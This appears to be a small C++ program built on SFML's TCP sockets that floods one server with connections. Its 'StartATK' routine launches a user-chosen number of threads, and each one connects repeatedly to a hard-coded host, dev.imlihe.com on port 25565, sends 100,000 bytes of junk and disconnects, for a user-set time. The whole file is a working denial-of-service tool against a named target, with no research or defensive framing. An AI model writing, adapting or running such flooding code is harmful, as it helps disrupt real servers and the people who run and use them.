#include"pch.hpp"
//#include"TConfig.hpp"

char pack[100000];

void ATKLair(bool* run)
{
	using namespace sf;
	TcpSocket connect;
	for (;*run;)
	{
		if (connect.connect("dev.imlihe.com", 25565) == Socket::Status::Done)
		{
			std::cout << "Connected" << std::endl;
			connect.send(pack,100000);
			connect.disconnect();
			std::this_thread::sleep_for(std::chrono::milliseconds(10));
		}
		else
		{
			connect.disconnect();
		}
	}
}

void StartATK(int num)
{
	size_t time;
	std::cout << "Time:";
	std::cin >> time;
	std::thread* thr = new std::thread[num];
	bool* run = new bool[num];
	for (int i = 0;i < num;i++)
	{
		run[i] = true;
		thr[i] = std::thread(ATKLair,&run[i]);
	}
	std::this_thread::sleep_for(std::chrono::milliseconds(time));
	for (int i = 0; i < num; i++)
	{
		run[i] = false;
	}
}

int main(int argi,char* argc[])
{
	int num;
	std::cout << "Num:";
	std::cin >> num;
	StartATK(num);
	return 0;
}